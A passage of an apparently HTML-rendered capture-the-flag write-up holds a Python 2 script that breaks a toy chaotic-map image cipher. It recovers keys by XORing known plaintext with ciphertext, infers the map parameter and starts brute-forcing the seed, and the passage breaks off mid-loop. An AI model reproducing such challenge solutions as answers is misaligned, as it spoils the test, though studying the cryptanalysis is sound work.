class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line">m1 = [</span><br><span class="line">    <span class="number">205</span>, <span class="number">237</span>, <span class="number">6</span>, <span class="number">158</span>, <span class="number">24</span>, <span class="number">119</span>, <span class="number">213</span>, <span class="number">32</span>, <span class="number">74</span>, <span class="number">151</span>, <span class="number">142</span>, <span class="number">186</span>, <span class="number">57</span>, <span class="number">28</span>, <span class="number">113</span>, <span class="number">62</span>,</span><br><span class="line">    <span class="number">165</span>, <span class="number">20</span>, <span class="number">190</span>, <span class="number">37</span>, <span class="number">159</span>, <span class="number">137</span>, <span class="number">196</span>, <span class="number">44</span>, <span class="number">97</span>, <span class="number">37</span>, <span class="number">7</span>, <span class="number">222</span>, <span class="number">220</span>, <span class="number">95</span>, <span class="number">4</span>, <span class="number">66</span>, <span class="number">0</span>, <span class="number">28</span>,</span><br><span class="line">    <span class="number">199</span>, <span class="number">142</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">119</span>, <span class="number">232</span>, <span class="number">250</span>, <span class="number">215</span>, <span class="number">60</span>, <span class="number">162</span>, <span class="number">91</span>, <span class="number">211</span>, <span class="number">63</span>, <span class="number">30</span>, <span class="number">91</span>, <span class="number">108</span>,</span><br><span class="line">    <span class="number">217</span>, <span class="number">206</span>, <span class="number">80</span>, <span class="number">193</span>, <span class="number">230</span>, <span class="number">42</span>, <span class="number">221</span>, <span class="number">71</span>, <span class="number">136</span>, <span class="number">115</span>, <span class="number">22</span>, <span class="number">176</span>, <span class="number">91</span>, <span class="number">57</span>, <span class="number">61</span>, <span class="number">3</span>, <span class="number">87</span>,</span><br><span class="line">    <span class="number">73</span>, <span class="number">250</span>, <span class="number">121</span>, <span class="number">51</span>, <span class="number">72</span>, <span class="number">83</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">199</span>, <span class="number">236</span>, <span class="number">190</span>, <span class="number">249</span>, <span class="number">116</span>, <span class="number">45</span>, <span class="number">6</span>, <span class="number">134</span>,</span><br><span class="line">    <span class="number">110</span>, <span class="number">149</span>, <span class="number">94</span>, <span class="number">214</span>, <span class="number">232</span>, <span class="number">153</span>, <span class="number">213</span>, <span class="number">119</span>, <span class="number">98</span>, <span class="number">81</span>, <span class="number">203</span>, <span class="number">240</span>, <span class="number">114</span>, <span class="number">240</span>, <span class="number">29</span>, <span class="number">122</span>,</span><br><span class="line">    <span class="number">188</span>, <span class="number">156</span>, <span class="number">53</span>, <span class="number">128</span>, <span class="number">185</span>, <span class="number">40</span>, <span class="number">147</span>, <span class="number">245</span>, <span class="number">204</span>, <span class="number">47</span>, <span class="number">101</span>, <span class="number">80</span>, <span class="number">229</span>, <span class="number">41</span>, <span class="number">150</span>, <span class="number">28</span>,</span><br><span class="line">    <span class="number">195</span>, <span class="number">25</span>, <span class="number">235</span>, <span class="number">119</span>, <span class="number">6</span>, <span class="number">192</span>, <span class="number">8</span>, <span class="number">73</span>, <span class="number">255</span>, <span class="number">159</span>, <span class="number">172</span>, <span class="number">77</span>, <span class="number">94</span>, <span class="number">254</span>, <span class="number">104</span>, <span class="number">236</span>,</span><br><span class="line">    <span class="number">219</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">195</span>, <span class="number">162</span>, <span class="number">97</span>, <span class="number">56</span>, <span class="number">252</span>, <span class="number">173</span>, <span class="number">163</span>, <span class="number">43</span>, <span class="number">167</span>, <span class="number">214</span>, <span class="number">50</span>, <span class="number">73</span>, <span class="number">115</span>,</span><br><span class="line">    <span class="number">190</span>, <span class="number">254</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">138</span>, <span class="number">192</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">190</span>, <span class="number">27</span>, <span class="number">37</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">135</span>, <span class="number">90</span>, <span class="number">215</span>,</span><br><span class="line">    <span class="number">106</span>, <span class="number">243</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">106</span>, <span class="number">89</span>, <span class="number">143</span>, <span class="number">150</span>, <span class="number">185</span>, <span class="number">142</span>, <span class="number">192</span>, <span class="number">176</span>, <span class="number">48</span>, <span class="number">138</span>, <span class="number">164</span>,</span><br><span class="line">    <span class="number">185</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">203</span>, <span class="number">210</span>, <span class="number">71</span>, <span class="number">186</span>, <span class="number">49</span>, <span class="number">162</span>, <span class="number">250</span>, <span class="number">218</span>, <span class="number">219</span>, <span class="number">195</span>, <span class="number">63</span>,</span><br><span class="line">    <span class="number">248</span>, <span class="number">220</span>, <span class="number">155</span>, <span class="number">180</span>, <span class="number">219</span>, <span class="number">132</span>, <span class="number">219</span>, <span class="number">94</span>, <span class="number">144</span>, <span class="number">247</span>, <span class="number">211</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">222</span>, <span class="number">31</span>,</span><br><span class="line">    <span class="number">69</span>, <span class="number">24</span>, <span class="number">13</span>, <span class="number">216</span>, <span class="number">185</span>, <span class="number">108</span>, <span class="number">137</span>, <span class="number">57</span>, <span class="number">186</span>, <span class="number">211</span>, <span class="number">55</span>, <span class="number">27</span>, <span class="number">158</span>, <span class="number">241</span>, <span class="number">223</span>, <span class="number">21</span>,</span><br><span class="line">    <span class="number">134</span>, <span class="number">106</span>, <span class="number">152</span>, <span class="number">127</span>, <span class="number">187</span>, <span class="number">245</span>, <span class="number">246</span>, <span class="number">131</span>, <span class="number">176</span>, <span class="number">177</span>, <span class="number">228</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">11</span>, <span class="number">84</span>,</span><br><span class="line">    <span class="number">61</span>, <span class="number">193</span>, <span class="number">42</span>, <span class="number">41</span>, <span class="number">69</span>, <span class="number">229</span>, <span class="number">145</span>, <span class="number">254</span>, <span class="number">138</span>, <span class="number">3</span>, <span class="number">153</span>, <span class="number">123</span>, <span class="number">31</span></span><br><span class="line">]</span><br><span class="line">c1 = [</span><br><span class="line">    <span class="number">131</span>, <span class="number">92</span>, <span class="number">72</span>, <span class="number">47</span>, <span class="number">177</span>, <span class="number">57</span>, <span class="number">131</span>, <span class="number">118</span>, <span class="number">4</span>, <span class="number">38</span>, <span class="number">192</span>, <span class="number">19</span>, <span class="number">119</span>, <span class="number">82</span>, <span class="number">63</span>, <span class="number">143</span>, <span class="number">235</span>,</span><br><span class="line">    <span class="number">165</span>, <span class="number">15</span>, <span class="number">140</span>, <span class="number">209</span>, <span class="number">223</span>, <span class="number">117</span>, <span class="number">133</span>, <span class="number">47</span>, <span class="number">148</span>, <span class="number">81</span>, <span class="number">144</span>, <span class="number">138</span>, <span class="number">246</span>, <span class="number">173</span>, <span class="number">235</span>,</span><br><span class="line">    <span class="number">177</span>, <span class="number">181</span>, <span class="number">110</span>, <span class="number">39</span>, <span class="number">9</span>, <span class="number">192</span>, <span class="number">57</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">153</span>, <span class="number">141</span>, <span class="number">19</span>, <span class="number">234</span>, <span class="number">157</span>, <span class="number">142</span>, <span class="number">80</span>,</span><br><span class="line">    <span class="number">234</span>, <span class="number">197</span>, <span class="number">151</span>, <span class="number">152</span>, <span class="number">249</span>, <span class="number">143</span>, <span class="number">176</span>, <span class="number">155</span>, <span class="number">147</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">194</span>, <span class="number">191</span>, <span class="number">254</span>, <span class="number">13</span>,</span><br><span class="line">    <span class="number">144</span>, <span class="number">140</span>, <span class="number">85</span>, <span class="number">25</span>, <span class="number">248</span>, <span class="number">172</span>, <span class="number">208</span>, <span class="number">154</span>, <span class="number">249</span>, <span class="number">5</span>, <span class="number">201</span>, <span class="number">27</span>, <span class="number">137</span>, <span class="number">69</span>, <span class="number">23</span>, <span class="number">175</span>,</span><br><span class="line">    <span class="number">34</span>, <span class="number">156</span>, <span class="number">72</span>, <span class="number">208</span>, <span class="number">32</span>, <span class="number">195</span>, <span class="number">16</span>, <span class="number">127</span>, <span class="number">65</span>, <span class="number">207</span>, <span class="number">131</span>, <span class="number">57</span>, <span class="number">203</span>, <span class="number">7</span>, <span class="number">98</span>, <span class="number">89</span>, <span class="number">36</span>,</span><br><span class="line">    <span class="number">65</span>, <span class="number">75</span>, <span class="number">211</span>, <span class="number">21</span>, <span class="number">45</span>, <span class="number">132</span>, <span class="number">214</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">58</span>, <span class="number">68</span>, <span class="number">130</span>, <span class="number">97</span>, <span class="number">204</span>, <span class="number">225</span>, <span class="number">76</span>,</span><br><span class="line">    <span class="number">152</span>, <span class="number">216</span>, <span class="number">74</span>, <span class="number">149</span>, <span class="number">79</span>, <span class="number">165</span>, <span class="number">198</span>, <span class="number">72</span>, <span class="number">150</span>, <span class="number">94</span>, <span class="number">7</span>, <span class="number">177</span>, <span class="number">46</span>, <span class="number">226</span>, <span class="number">252</span>, <span class="number">247</span>,</span><br><span class="line">    <span class="number">79</span>, <span class="number">62</span>, <span class="number">69</span>, <span class="number">106</span>, <span class="number">60</span>, <span class="number">21</span>, <span class="number">106</span>, <span class="number">236</span>, <span class="number">47</span>, <span class="number">145</span>, <span class="number">170</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">101</span>, <span class="number">14</span>, <span class="number">152</span>, <span class="number">131</span>,</span><br><span class="line">    <span class="number">7</span>, <span class="number">37</span>, <span class="number">15</span>, <span class="number">168</span>, <span class="number">99</span>, <span class="number">115</span>, <span class="number">27</span>, <span class="number">220</span>, <span class="number">150</span>, <span class="number">89</span>, <span class="number">82</span>, <span class="number">232</span>, <span class="number">170</span>, <span class="number">107</span>, <span class="number">221</span>, <span class="number">212</span>, <span class="number">46</span>,</span><br><span class="line">    <span class="number">235</span>, <span class="number">129</span>, <span class="number">36</span>, <span class="number">66</span>, <span class="number">217</span>, <span class="number">222</span>, <span class="number">36</span>, <span class="number">15</span>, <span class="number">217</span>, <span class="number">192</span>, <span class="number">247</span>, <span class="number">192</span>, <span class="number">113</span>, <span class="number">230</span>, <span class="number">129</span>, <span class="number">196</span>,</span><br><span class="line">    <span class="number">13</span>, <span class="number">247</span>, <span class="number">148</span>, <span class="number">228</span>, <span class="number">225</span>, <span class="number">86</span>, <span class="number">71</span>, <span class="number">133</span>, <span class="number">132</span>, <span class="number">238</span>, <span class="number">236</span>, <span class="number">127</span>, <span class="number">11</span>, <span class="number">83</span>, <span class="number">107</span>, <span class="number">141</span>,</span><br><span class="line">    <span class="number">114</span>, <span class="number">150</span>, <span class="number">182</span>, <span class="number">146</span>, <span class="number">213</span>, <span class="number">250</span>, <span class="number">141</span>, <span class="number">53</span>, <span class="number">114</span>, <span class="number">16</span>, <span class="number">198</span>, <span class="number">70</span>, <span class="number">133</span>, <span class="number">17</span>, <span class="number">247</span>, <span class="number">173</span>,</span><br><span class="line">    <span class="number">136</span>, <span class="number">73</span>, <span class="number">236</span>, <span class="number">78</span>, <span class="number">188</span>, <span class="number">150</span>, <span class="number">239</span>, <span class="number">58</span>, <span class="number">199</span>, <span class="number">136</span>, <span class="number">11</span>, <span class="number">122</span>, <span class="number">134</span>, <span class="number">77</span>, <span class="number">47</span>, <span class="number">167</span>,</span><br><span class="line">    <span class="number">137</span>, <span class="number">188</span>, <span class="number">55</span>, <span class="number">195</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">245</span>, <span class="number">92</span>, <span class="number">160</span>, <span class="number">213</span>, <span class="number">254</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">205</span>, <span class="number">193</span>, <span class="number">69</span>, <span class="number">2</span>,</span><br><span class="line">    <span class="number">140</span>, <span class="number">143</span>, <span class="number">155</span>, <span class="number">127</span>, <span class="number">236</span>, <span class="number">179</span>, <span class="number">199</span>, <span class="number">168</span>, <span class="number">35</span>, <span class="number">85</span>, <span class="number">40</span>, <span class="number">45</span>, <span class="number">174</span></span><br><span class="line">]</span><br><span class="line">c2 = [</span><br><span class="line">    <span class="number">198</span>, <span class="number">143</span>, <span class="number">247</span>, <span class="number">3</span>, <span class="number">152</span>, <span class="number">139</span>, <span class="number">131</span>, <span class="number">84</span>, <span class="number">181</span>, <span class="number">180</span>, <span class="number">252</span>, <span class="number">177</span>, <span class="number">192</span>, <span class="number">25</span>, <span class="number">217</span>, <span class="number">179</span>,</span><br><span class="line">    <span class="number">136</span>, <span class="number">107</span>, <span class="number">190</span>, <span class="number">62</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">105</span>, <span class="number">238</span>, <span class="number">117</span>, <span class="number">44</span>, <span class="number">5</span>, <span class="number">116</span>, <span class="number">132</span>, <span class="number">195</span>, <span class="number">214</span>,</span><br><span class="line">    <span class="number">171</span>, <span class="number">113</span>, <span class="number">209</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">194</span>, <span class="number">174</span>, <span class="number">228</span>, <span class="number">212</span>, <span class="number">196</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">41</span>, <span class="number">211</span>, <span class="number">56</span>, <span class="number">139</span>,</span><br><span class="line">    <span class="number">135</span>, <span class="number">225</span>, <span class="number">214</span>, <span class="number">89</span>, <span class="number">122</span>, <span class="number">178</span>, <span class="number">212</span>, <span class="number">185</span>, <span class="number">231</span>, <span class="number">204</span>, <span class="number">150</span>, <span class="number">204</span>, <span class="number">212</span>, <span class="number">160</span>, <span class="number">142</span>,</span><br><span class="line">    <span class="number">213</span>, <span class="number">173</span>, <span class="number">186</span>, <span class="number">166</span>, <span class="number">65</span>, <span class="number">238</span>, <span class="number">5</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">31</span>, <span class="number">25</span>, <span class="number">189</span>, <span class="number">148</span>, <span class="number">38</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">33</span>,</span><br><span class="line">    <span class="number">56</span>, <span class="number">227</span>, <span class="number">48</span>, <span class="number">103</span>, <span class="number">163</span>, <span class="number">31</span>, <span class="number">189</span>, <span class="number">37</span>, <span class="number">124</span>, <span class="number">106</span>, <span class="number">249</span>, <span class="number">86</span>, <span class="number">188</span>, <span class="number">86</span>, <span class="number">233</span>, <span class="number">41</span>,</span><br><span class="line">    <span class="number">250</span>, <span class="number">89</span>, <span class="number">7</span>, <span class="number">212</span>, <span class="number">234</span>, <span class="number">111</span>, <span class="number">104</span>, <span class="number">245</span>, <span class="number">102</span>, <span class="number">227</span>, <span class="number">96</span>, <span class="number">160</span>, <span class="number">67</span>, <span class="number">181</span>, <span class="number">13</span>, <span class="number">26</span>,</span><br><span class="line">    <span class="number">192</span>, <span class="number">214</span>, <span class="number">210</span>, <span class="number">188</span>, <span class="number">84</span>, <span class="number">216</span>, <span class="number">215</span>, <span class="number">243</span>, <span class="number">72</span>, <span class="number">233</span>, <span class="number">2</span>, <span class="number">122</span>, <span class="number">166</span>, <span class="number">107</span>, <span class="number">251</span>, <span class="number">70</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">94</span>, <span class="number">190</span>, <span class="number">185</span>, <span class="number">210</span>, <span class="number">34</span>, <span class="number">85</span>, <span class="number">77</span>, <span class="number">29</span>, <span class="number">182</span>, <span class="number">77</span>, <span class="number">115</span>, <span class="number">208</span>, <span class="number">228</span>, <span class="number">252</span>, <span class="number">73</span>,</span><br><span class="line">    <span class="number">198</span>, <span class="number">151</span>, <span class="number">70</span>, <span class="number">10</span>, <span class="number">97</span>, <span class="number">138</span>, <span class="number">235</span>, <span class="number">21</span>, <span class="number">117</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">129</span>, <span class="number">2</span>, <span class="number">253</span>, <span class="number">80</span>, <span class="number">53</span>, <span class="number">61</span>,</span><br><span class="line">    <span class="number">184</span>, <span class="number">220</span>, <span class="number">41</span>, <span class="number">82</span>, <span class="number">37</span>, <span class="number">140</span>, <span class="number">23</span>, <span class="number">143</span>, <span class="number">179</span>, <span class="number">53</span>, <span class="number">153</span>, <span class="number">113</span>, <span class="number">213</span>, <span class="number">211</span>, <span class="number">111</span>, <span class="number">197</span>,</span><br><span class="line">    <span class="number">248</span>, <span class="number">65</span>, <span class="number">60</span>, <span class="number">69</span>, <span class="number">1</span>, <span class="number">81</span>, <span class="number">48</span>, <span class="number">254</span>, <span class="number">251</span>, <span class="number">89</span>, <span class="number">195</span>, <span class="number">8</span>, <span class="number">93</span>, <span class="number">190</span>, <span class="number">66</span>, <span class="number">174</span>, <span class="number">97</span>,</span><br><span class="line">    <span class="number">175</span>, <span class="number">210</span>, <span class="number">191</span>, <span class="number">66</span>, <span class="number">112</span>, <span class="number">123</span>, <span class="number">128</span>, <span class="number">33</span>, <span class="number">230</span>, <span class="number">237</span>, <span class="number">104</span>, <span class="number">16</span>, <span class="number">192</span>, <span class="number">239</span>, <span class="number">173</span>, <span class="number">44</span>,</span><br><span class="line">    <span class="number">10</span>, <span class="number">120</span>, <span class="number">231</span>, <span class="number">114</span>, <span class="number">151</span>, <span class="number">140</span>, <span class="number">63</span>, <span class="number">103</span>, <span class="number">44</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">242</span>, <span class="number">73</span>, <span class="number">51</span>, <span class="number">46</span>, <span class="number">98</span>,</span><br><span class="line">    <span class="number">137</span>, <span class="number">163</span>, <span class="number">152</span>, <span class="number">147</span>, <span class="number">95</span>, <span class="number">223</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">215</span>, <span class="number">133</span>, <span class="number">131</span>, <span class="number">240</span>, <span class="number">239</span>, <span class="number">224</span>,</span><br><span class="line">    <span class="number">195</span>, <span class="number">140</span>, <span class="number">124</span>, <span class="number">70</span>, <span class="number">156</span>, <span class="number">221</span>, <span class="number">241</span>, <span class="number">37</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">99</span>, <span class="number">9</span>, <span class="number">157</span>, <span class="number">99</span>, <span class="number">150</span>, <span class="number">47</span>, <span class="number">118</span>,</span><br><span class="line">    <span class="number">225</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">141</span>, <span class="number">135</span>, <span class="number">99</span>, <span class="number">18</span>, <span class="number">119</span>, <span class="number">63</span>, <span class="number">160</span>, <span class="number">6</span>, <span class="number">247</span>, <span class="number">27</span>, <span class="number">68</span>, <span class="number">45</span>, <span class="number">199</span>, <span class="number">86</span>,</span><br><span class="line">    <span class="number">193</span>, <span class="number">252</span>, <span class="number">21</span>, <span class="number">135</span>, <span class="number">32</span>, <span class="number">42</span>, <span class="number">103</span>, <span class="number">114</span>, <span class="number">241</span>, <span class="number">49</span>, <span class="number">249</span>, <span class="number">182</span>, <span class="number">52</span>, <span class="number">18</span>, <span class="number">155</span>, <span class="number">157</span>,</span><br><span class="line">    <span class="number">61</span>, <span class="number">4</span>, <span class="number">246</span>, <span class="number">158</span>, <span class="number">52</span>, <span class="number">118</span>, <span class="number">242</span>, <span class="number">195</span>, <span class="number">54</span>, <span class="number">139</span>, <span class="number">232</span>, <span class="number">100</span>, <span class="number">31</span>, <span class="number">11</span>, <span class="number">233</span>, <span class="number">58</span>,</span><br><span class="line">    <span class="number">100</span>, <span class="number">101</span>, <span class="number">137</span>, <span class="number">83</span>, <span class="number">145</span>, <span class="number">209</span>, <span class="number">7</span>, <span class="number">241</span>, <span class="number">96</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">207</span>, <span class="number">29</span>, <span class="number">237</span>, <span class="number">124</span>, <span class="number">177</span>,</span><br><span class="line">    <span class="number">166</span>, <span class="number">161</span>, <span class="number">20</span>, <span class="number">116</span>, <span class="number">122</span>, <span class="number">61</span>, <span class="number">71</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">157</span>, <span class="number">253</span>, <span class="number">130</span>, <span class="number">112</span>, <span class="number">66</span>, <span class="number">94</span>, <span class="number">57</span>,</span><br><span class="line">    <span class="number">221</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">192</span>, <span class="number">147</span>, <span class="number">5</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">174</span>, <span class="number">26</span>, <span class="number">160</span>, <span class="number">16</span>, <span class="number">188</span>, <span class="number">103</span>, <span class="number">187</span>, <span class="number">11</span>,</span><br><span class="line">    <span class="number">238</span>, <span class="number">182</span>, <span class="number">144</span>, <span class="number">4</span>, <span class="number">137</span>, <span class="number">33</span>, <span class="number">84</span>, <span class="number">100</span>, <span class="number">7</span>, <span class="number">239</span>, <span class="number">219</span>, <span class="number">83</span>, <span class="number">112</span>, <span class="number">189</span>, <span class="number">166</span>, <span class="number">58</span>, <span class="number">93</span>,</span><br><span class="line">    <span class="number">141</span>, <span class="number">30</span>, <span class="number">198</span>, <span class="number">220</span>, <span class="number">196</span>, <span class="number">118</span>, <span class="number">172</span>, <span class="number">5</span>, <span class="number">45</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">pixel,key1,key2,x0,m,n</span>):</span></span><br><span class="line">    num = m*n/<span class="number">8</span>    </span><br><span class="line">    seqs = []</span><br><span class="line">    x = x0</span><br><span class="line">    bins = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        x = generate(x)</span><br><span class="line">        tmp.append(x)</span><br><span class="line">        seqs.append(<span class="built_in">int</span>(x*<span class="number">22000</span>))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> seqs:</span><br><span class="line">        bin_x  = <span class="built_in">bin</span>(x)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(bin_x) &lt; <span class="number">16</span>:</span><br><span class="line">            bin_x = <span class="string">&#x27;0&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(bin_x))+bin_x</span><br><span class="line">        bins += bin_x</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(pixel) == m*n)</span><br><span class="line">    cipher = [ <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            index = n*i+j</span><br><span class="line">            ch = <span class="built_in">int</span>(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>],<span class="number">2</span>)</span><br><span class="line">            pix = pixel[index]</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">                pix = (pix^key1)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">                pix = (~(pix^key1))&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">                pix = (pix^key2)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">                pix = (~(pix^key2))&amp;<span class="number">0xff</span></span><br><span class="line">            cipher[index] = pix </span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">round</span>(r * x * (<span class="number">3</span> - x), <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(m1, c1):</span><br><span class="line">    key.append(i ^ j)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">key1 may 169 177 78 86</span></span><br><span class="line"><span class="string">if key1= 169 key2 only may 78 or 177 </span></span><br><span class="line"><span class="string">8 combinations</span></span><br><span class="line"><span class="string">ey1 = 169 ,key2 = 78 get result</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">bitstream = <span class="string">&#x27;&#x27;</span></span><br><span class="line">X = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">78</span>:</span><br><span class="line">        bitstream += <span class="string">&#x27;10&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">169</span>:</span><br><span class="line">        bitstream += <span class="string">&#x27;00&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">177</span>:</span><br><span class="line">        bitstream += <span class="string">&#x27;11&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">86</span>:</span><br><span class="line">        bitstream += <span class="string">&#x27;01&#x27;</span></span><br><span class="line"></span><br><span class="line">key1 = <span class="number">169</span></span><br><span class="line">key2 = <span class="number">78</span></span><br><span class="line">S = time()</span><br><span class="line">X0 = <span class="built_in">int</span>(bitstream[:<span class="number">16</span>],<span class="number">2</span>) / <span class="number">22000.000000</span></span><br><span class="line">X1 = <span class="built_in">int</span>(bitstream[<span class="number">16</span>:<span class="number">32</span>],<span class="number">2</span>) / <span class="number">22000.000000</span></span><br><span class="line">r = <span class="built_in">round</span>(X1 / (<span class="number">3</span>*X0 - X0**<span class="number">2</span>),<span class="number">1</span>)</span><br><span class="line">print(r)</span><br><span class="line"><span class="keyword">for</span> x0 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>**<span class="number">6</span>):</span><br><span class="line">        x = <span class="built_in">round</span>(x0 / <span class="number">1000000.000000</span>,<span class="number">6</span>)</span><br><span class="line">        bins = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        tmp = []</span><br><span class="line">        seqs = []</span><br><span class="line">        d = <span class="number">16</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(d):</span><br><span 